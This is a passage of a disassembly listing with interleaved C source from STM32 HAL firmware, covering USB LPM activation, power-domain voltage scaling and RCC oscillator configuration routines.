    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 80039cc:	687b      	ldr	r3, [r7, #4]
 80039ce:	0c1b      	lsrs	r3, r3, #16
 80039d0:	b29a      	uxth	r2, r3
 80039d2:	697b      	ldr	r3, [r7, #20]
 80039d4:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 80039d6:	2300      	movs	r3, #0
}
 80039d8:	4618      	mov	r0, r3
 80039da:	371c      	adds	r7, #28
 80039dc:	46bd      	mov	sp, r7
 80039de:	f85d 7b04 	ldr.w	r7, [sp], #4
 80039e2:	4770      	bx	lr

080039e4 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 80039e4:	b480      	push	{r7}
 80039e6:	b085      	sub	sp, #20
 80039e8:	af00      	add	r7, sp, #0
 80039ea:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 80039ec:	687b      	ldr	r3, [r7, #4]
 80039ee:	681b      	ldr	r3, [r3, #0]
 80039f0:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 80039f2:	687b      	ldr	r3, [r7, #4]
 80039f4:	2201      	movs	r2, #1
 80039f6:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 80039fa:	687b      	ldr	r3, [r7, #4]
 80039fc:	2200      	movs	r2, #0
 80039fe:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 8003a02:	68fb      	ldr	r3, [r7, #12]
 8003a04:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003a08:	b29b      	uxth	r3, r3
 8003a0a:	f043 0301 	orr.w	r3, r3, #1
 8003a0e:	b29a      	uxth	r2, r3
 8003a10:	68fb      	ldr	r3, [r7, #12]
 8003a12:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 8003a16:	68fb      	ldr	r3, [r7, #12]
 8003a18:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003a1c:	b29b      	uxth	r3, r3
 8003a1e:	f043 0302 	orr.w	r3, r3, #2
 8003a22:	b29a      	uxth	r2, r3
 8003a24:	68fb      	ldr	r3, [r7, #12]
 8003a26:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 8003a2a:	2300      	movs	r3, #0
}
 8003a2c:	4618      	mov	r0, r3
 8003a2e:	3714      	adds	r7, #20
 8003a30:	46bd      	mov	sp, r7
 8003a32:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a36:	4770      	bx	lr

08003a38 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 8003a38:	b480      	push	{r7}
 8003a3a:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003a3c:	4b05      	ldr	r3, [pc, #20]	; (8003a54 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003a3e:	681b      	ldr	r3, [r3, #0]
 8003a40:	4a04      	ldr	r2, [pc, #16]	; (8003a54 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003a42:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003a46:	6013      	str	r3, [r2, #0]
}
 8003a48:	bf00      	nop
 8003a4a:	46bd      	mov	sp, r7
 8003a4c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a50:	4770      	bx	lr
 8003a52:	bf00      	nop
 8003a54:	40007000 	.word	0x40007000

08003a58 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 8003a58:	b480      	push	{r7}
 8003a5a:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 8003a5c:	4b04      	ldr	r3, [pc, #16]	; (8003a70 <HAL_PWREx_GetVoltageRange+0x18>)
 8003a5e:	681b      	ldr	r3, [r3, #0]
 8003a60:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 8003a64:	4618      	mov	r0, r3
 8003a66:	46bd      	mov	sp, r7
 8003a68:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a6c:	4770      	bx	lr
 8003a6e:	bf00      	nop
 8003a70:	40007000 	.word	0x40007000

08003a74 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 8003a74:	b480      	push	{r7}
 8003a76:	b085      	sub	sp, #20
 8003a78:	af00      	add	r7, sp, #0
 8003a7a:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 8003a7c:	687b      	ldr	r3, [r7, #4]
 8003a7e:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003a82:	d130      	bne.n	8003ae6 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 8003a84:	4b23      	ldr	r3, [pc, #140]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a86:	681b      	ldr	r3, [r3, #0]
 8003a88:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003a8c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003a90:	d038      	beq.n	8003b04 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 8003a92:	4b20      	ldr	r3, [pc, #128]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a94:	681b      	ldr	r3, [r3, #0]
 8003a96:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003a9a:	4a1e      	ldr	r2, [pc, #120]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a9c:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8003aa0:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 8003aa2:	4b1d      	ldr	r3, [pc, #116]	; (8003b18 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003aa4:	681b      	ldr	r3, [r3, #0]
 8003aa6:	2232      	movs	r2, #50	; 0x32
 8003aa8:	fb02 f303 	mul.w	r3, r2, r3
 8003aac:	4a1b      	ldr	r2, [pc, #108]	; (8003b1c <HAL_PWREx_ControlVoltageScaling+0xa8>)
 8003aae:	fba2 2303 	umull	r2, r3, r2, r3
 8003ab2:	0c9b      	lsrs	r3, r3, #18
 8003ab4:	3301      	adds	r3, #1
 8003ab6:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003ab8:	e002      	b.n	8003ac0 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 8003aba:	68fb      	ldr	r3, [r7, #12]
 8003abc:	3b01      	subs	r3, #1
 8003abe:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003ac0:	4b14      	ldr	r3, [pc, #80]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003ac2:	695b      	ldr	r3, [r3, #20]
 8003ac4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003ac8:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003acc:	d102      	bne.n	8003ad4 <HAL_PWREx_ControlVoltageScaling+0x60>
 8003ace:	68fb      	ldr	r3, [r7, #12]
 8003ad0:	2b00      	cmp	r3, #0
 8003ad2:	d1f2      	bne.n	8003aba <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003ad4:	4b0f      	ldr	r3, [pc, #60]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003ad6:	695b      	ldr	r3, [r3, #20]
 8003ad8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003adc:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003ae0:	d110      	bne.n	8003b04 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003ae2:	2303      	movs	r3, #3
 8003ae4:	e00f      	b.n	8003b06 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003ae6:	4b0b      	ldr	r3, [pc, #44]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003ae8:	681b      	ldr	r3, [r3, #0]
 8003aea:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003aee:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003af2:	d007      	beq.n	8003b04 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003af4:	4b07      	ldr	r3, [pc, #28]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003af6:	681b      	ldr	r3, [r3, #0]
 8003af8:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003afc:	4a05      	ldr	r2, [pc, #20]	; (8003b14 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003afe:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003b02:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003b04:	2300      	movs	r3, #0
}
 8003b06:	4618      	mov	r0, r3
 8003b08:	3714      	adds	r7, #20
 8003b0a:	46bd      	mov	sp, r7
 8003b0c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003b10:	4770      	bx	lr
 8003b12:	bf00      	nop
 8003b14:	40007000 	.word	0x40007000
 8003b18:	20000000 	.word	0x20000000
 8003b1c:	431bde83 	.word	0x431bde83

08003b20 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003b20:	b480      	push	{r7}
 8003b22:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003b24:	4b05      	ldr	r3, [pc, #20]	; (8003b3c <HAL_PWREx_EnableVddUSB+0x1c>)
 8003b26:	685b      	ldr	r3, [r3, #4]
 8003b28:	4a04      	ldr	r2, [pc, #16]	; (8003b3c <HAL_PWREx_EnableVddUSB+0x1c>)
 8003b2a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003b2e:	6053      	str	r3, [r2, #4]
}
 8003b30:	bf00      	nop
 8003b32:	46bd      	mov	sp, r7
 8003b34:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003b38:	4770      	bx	lr
 8003b3a:	bf00      	nop
 8003b3c:	40007000 	.word	0x40007000

08003b40 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003b40:	b580      	push	{r7, lr}
 8003b42:	b088      	sub	sp, #32
 8003b44:	af00      	add	r7, sp, #0
 8003b46:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003b48:	687b      	ldr	r3, [r7, #4]
 8003b4a:	2b00      	cmp	r3, #0
 8003b4c:	d102      	bne.n	8003b54 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 8003b4e:	2301      	movs	r3, #1
 8003b50:	f000 bc02 	b.w	8004358 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003b54:	4b96      	ldr	r3, [pc, #600]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003b56:	689b      	ldr	r3, [r3, #8]
 8003b58:	f003 030c 	and.w	r3, r3, #12
 8003b5c:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 8003b5e:	4b94      	ldr	r3, [pc, #592]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003b60:	68db      	ldr	r3, [r3, #12]
 8003b62:	f003 0303 	and.w	r3, r3, #3
 8003b66:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003b68:	687b      	ldr	r3, [r7, #4]
 8003b6a:	681b      	ldr	r3, [r3, #0]
 8003b6c:	f003 0310 	and.w	r3, r3, #16
 8003b70:	2b00      	cmp	r3, #0
 8003b72:	f000 80e4 	beq.w	8003d3e <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003b76:	69bb      	ldr	r3, [r7, #24]
 8003b78:	2b00      	cmp	r3, #0
 8003b7a:	d007      	beq.n	8003b8c <HAL_RCC_OscConfig+0x4c>
 8003b7c:	69bb      	ldr	r3, [r7, #24]
 8003b7e:	2b0c      	cmp	r3, #12
 8003b80:	f040 808b 	bne.w	8003c9a <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003b84:	697b      	ldr	r3, [r7, #20]
 8003b86:	2b01      	cmp	r3, #1
 8003b88:	f040 8087 	bne.w	8003c9a <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003b8c:	4b88      	ldr	r3, [pc, #544]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003b8e:	681b      	ldr	r3, [r3, #0]
 8003b90:	f003 0302 	and.w	r3, r3, #2
 8003b94:	2b00      	cmp	r3, #0
 8003b96:	d005      	beq.n	8003ba4 <HAL_RCC_OscConfig+0x64>
 8003b98:	687b      	ldr	r3, [r7, #4]
 8003b9a:	699b      	ldr	r3, [r3, #24]
 8003b9c:	2b00      	cmp	r3, #0
 8003b9e:	d101      	bne.n	8003ba4 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003ba0:	2301      	movs	r3, #1
 8003ba2:	e3d9      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003ba4:	687b      	ldr	r3, [r7, #4]
 8003ba6:	6a1a      	ldr	r2, [r3, #32]
 8003ba8:	4b81      	ldr	r3, [pc, #516]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003baa:	681b      	ldr	r3, [r3, #0]
 8003bac:	f003 0308 	and.w	r3, r3, #8
 8003bb0:	2b00      	cmp	r3, #0
 8003bb2:	d004      	beq.n	8003bbe <HAL_RCC_OscConfig+0x7e>
 8003bb4:	4b7e      	ldr	r3, [pc, #504]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003bb6:	681b      	ldr	r3, [r3, #0]
 8003bb8:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003bbc:	e005      	b.n	8003bca <HAL_RCC_OscConfig+0x8a>
 8003bbe:	4b7c      	ldr	r3, [pc, #496]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003bc0:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003bc4:	091b      	lsrs	r3, r3, #4
 8003bc6:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003bca:	4293      	cmp	r3, r2
 8003bcc:	d223      	bcs.n	8003c16 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003bce:	687b      	ldr	r3, [r7, #4]
 8003bd0:	6a1b      	ldr	r3, [r3, #32]
 8003bd2:	4618      	mov	r0, r3
 8003bd4:	f000 fd8c 	bl	80046f0 <RCC_SetFlashLatencyFromMSIRange>
 8003bd8:	4603      	mov	r3, r0
 8003bda:	2b00      	cmp	r3, #0
 8003bdc:	d001      	beq.n	8003be2 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 8003bde:	2301      	movs	r3, #1
 8003be0:	e3ba      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003be2:	4b73      	ldr	r3, [pc, #460]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003be4:	681b      	ldr	r3, [r3, #0]
 8003be6:	4a72      	ldr	r2, [pc, #456]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003be8:	f043 0308 	orr.w	r3, r3, #8
 8003bec:	6013      	str	r3, [r2, #0]
 8003bee:	4b70      	ldr	r3, [pc, #448]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003bf0:	681b      	ldr	r3, [r3, #0]
 8003bf2:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003bf6:	687b      	ldr	r3, [r7, #4]
 8003bf8:	6a1b      	ldr	r3, [r3, #32]
 8003bfa:	496d      	ldr	r1, [pc, #436]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003bfc:	4313      	orrs	r3, r2
 8003bfe:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003c00:	4b6b      	ldr	r3, [pc, #428]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c02:	685b      	ldr	r3, [r3, #4]
 8003c04:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003c08:	687b      	ldr	r3, [r7, #4]
 8003c0a:	69db      	ldr	r3, [r3, #28]
 8003c0c:	021b      	lsls	r3, r3, #8
 8003c0e:	4968      	ldr	r1, [pc, #416]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c10:	4313      	orrs	r3, r2
 8003c12:	604b      	str	r3, [r1, #4]
 8003c14:	e025      	b.n	8003c62 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003c16:	4b66      	ldr	r3, [pc, #408]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c18:	681b      	ldr	r3, [r3, #0]
 8003c1a:	4a65      	ldr	r2, [pc, #404]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c1c:	f043 0308 	orr.w	r3, r3, #8
 8003c20:	6013      	str	r3, [r2, #0]
 8003c22:	4b63      	ldr	r3, [pc, #396]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c24:	681b      	ldr	r3, [r3, #0]
 8003c26:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003c2a:	687b      	ldr	r3, [r7, #4]
 8003c2c:	6a1b      	ldr	r3, [r3, #32]
 8003c2e:	4960      	ldr	r1, [pc, #384]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c30:	4313      	orrs	r3, r2
 8003c32:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003c34:	4b5e      	ldr	r3, [pc, #376]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c36:	685b      	ldr	r3, [r3, #4]
 8003c38:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003c3c:	687b      	ldr	r3, [r7, #4]
 8003c3e:	69db      	ldr	r3, [r3, #28]
 8003c40:	021b      	lsls	r3, r3, #8
 8003c42:	495b      	ldr	r1, [pc, #364]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c44:	4313      	orrs	r3, r2
 8003c46:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003c48:	69bb      	ldr	r3, [r7, #24]
 8003c4a:	2b00      	cmp	r3, #0
 8003c4c:	d109      	bne.n	8003c62 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003c4e:	687b      	ldr	r3, [r7, #4]
 8003c50:	6a1b      	ldr	r3, [r3, #32]
 8003c52:	4618      	mov	r0, r3
 8003c54:	f000 fd4c 	bl	80046f0 <RCC_SetFlashLatencyFromMSIRange>
 8003c58:	4603      	mov	r3, r0
 8003c5a:	2b00      	cmp	r3, #0
 8003c5c:	d001      	beq.n	8003c62 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003c5e:	2301      	movs	r3, #1
 8003c60:	e37a      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003c62:	f000 fc81 	bl	8004568 <HAL_RCC_GetSysClockFreq>
 8003c66:	4602      	mov	r2, r0
 8003c68:	4b51      	ldr	r3, [pc, #324]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003c6a:	689b      	ldr	r3, [r3, #8]
 8003c6c:	091b      	lsrs	r3, r3, #4
 8003c6e:	f003 030f 	and.w	r3, r3, #15
 8003c72:	4950      	ldr	r1, [pc, #320]	; (8003db4 <HAL_RCC_OscConfig+0x274>)
 8003c74:	5ccb      	ldrb	r3, [r1, r3]
 8003c76:	f003 031f 	and.w	r3, r3, #31
 8003c7a:	fa22 f303 	lsr.w	r3, r2, r3
 8003c7e:	4a4e      	ldr	r2, [pc, #312]	; (8003db8 <HAL_RCC_OscConfig+0x278>)
 8003c80:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003c82:	4b4e      	ldr	r3, [pc, #312]	; (8003dbc <HAL_RCC_OscConfig+0x27c>)
 8003c84:	681b      	ldr	r3, [r3, #0]
 8003c86:	4618      	mov	r0, r3
 8003c88:	f7fd fb86 	bl	8001398 <HAL_InitTick>
 8003c8c:	4603      	mov	r3, r0
 8003c8e:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003c90:	7bfb      	ldrb	r3, [r7, #15]
 8003c92:	2b00      	cmp	r3, #0
 8003c94:	d052      	beq.n	8003d3c <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003c96:	7bfb      	ldrb	r3, [r7, #15]
 8003c98:	e35e      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003c9a:	687b      	ldr	r3, [r7, #4]
 8003c9c:	699b      	ldr	r3, [r3, #24]
 8003c9e:	2b00      	cmp	r3, #0
 8003ca0:	d032      	beq.n	8003d08 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003ca2:	4b43      	ldr	r3, [pc, #268]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003ca4:	681b      	ldr	r3, [r3, #0]
 8003ca6:	4a42      	ldr	r2, [pc, #264]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003ca8:	f043 0301 	orr.w	r3, r3, #1
 8003cac:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003cae:	f7fd fbc3 	bl	8001438 <HAL_GetTick>
 8003cb2:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003cb4:	e008      	b.n	8003cc8 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003cb6:	f7fd fbbf 	bl	8001438 <HAL_GetTick>
 8003cba:	4602      	mov	r2, r0
 8003cbc:	693b      	ldr	r3, [r7, #16]
 8003cbe:	1ad3      	subs	r3, r2, r3
 8003cc0:	2b02      	cmp	r3, #2
 8003cc2:	d901      	bls.n	8003cc8 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003cc4:	2303      	movs	r3, #3
 8003cc6:	e347      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003cc8:	4b39      	ldr	r3, [pc, #228]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003cca:	681b      	ldr	r3, [r3, #0]
 8003ccc:	f003 0302 	and.w	r3, r3, #2
 8003cd0:	2b00      	cmp	r3, #0
 8003cd2:	d0f0      	beq.n	8003cb6 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003cd4:	4b36      	ldr	r3, [pc, #216]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003cd6:	681b      	ldr	r3, [r3, #0]
 8003cd8:	4a35      	ldr	r2, [pc, #212]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003cda:	f043 0308 	orr.w	r3, r3, #8
 8003cde:	6013      	str	r3, [r2, #0]
 8003ce0:	4b33      	ldr	r3, [pc, #204]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003ce2:	681b      	ldr	r3, [r3, #0]
 8003ce4:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003ce8:	687b      	ldr	r3, [r7, #4]
 8003cea:	6a1b      	ldr	r3, [r3, #32]
 8003cec:	4930      	ldr	r1, [pc, #192]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003cee:	4313      	orrs	r3, r2
 8003cf0:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003cf2:	4b2f      	ldr	r3, [pc, #188]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003cf4:	685b      	ldr	r3, [r3, #4]
 8003cf6:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003cfa:	687b      	ldr	r3, [r7, #4]
 8003cfc:	69db      	ldr	r3, [r3, #28]
 8003cfe:	021b      	lsls	r3, r3, #8
 8003d00:	492b      	ldr	r1, [pc, #172]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d02:	4313      	orrs	r3, r2
 8003d04:	604b      	str	r3, [r1, #4]
 8003d06:	e01a      	b.n	8003d3e <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003d08:	4b29      	ldr	r3, [pc, #164]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
 8003d0a:	681b      	ldr	r3, [r3, #0]
 8003d0c:	4a28      	ldr	r2, [pc, #160]	; (8003db0 <HAL_RCC_OscConfig+0x270>)
